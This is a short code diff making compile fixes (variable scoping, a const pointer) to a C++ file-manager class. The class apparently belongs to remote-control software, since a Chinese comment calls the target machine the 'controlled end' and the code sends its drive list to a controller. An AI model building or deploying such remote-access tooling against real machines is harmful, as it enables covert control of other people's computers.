@@ -56,7 +56,8 @@ UINT CFileManager::SendDriveList()              //获得被控端的磁盘信息
 	
 
 	//注意这里的dwOffset不能从0 因为0单位存储的是消息类型
-	for (DWORD dwOffset = 1; *pDrive != '\0'; pDrive += lstrlen(pDrive) + 1)   //这里的+1为了过\0
+	DWORD dwOffset = 1;
+	for (; *pDrive != '\0'; pDrive += lstrlen(pDrive) + 1)   //这里的+1为了过\0
 	{
 		memset(FileSystem, 0, sizeof(FileSystem));
 	
@@ -794,7 +795,7 @@ bool CFileManager::OpenFile(LPCTSTR lpFile, INT nShowCmd)
 	char	*lpstrCat = NULL;
 	memset(strTemp, 0, sizeof(strTemp));
 	
-	char	*lpExt = strrchr(lpFile, '.');   //定位到最后一个.也就是我们要文件属性
+	const char	*lpExt = strrchr(lpFile, '.');   //定位到最后一个.也就是我们要文件属性
 	if (!lpExt)
 		return false;
 	
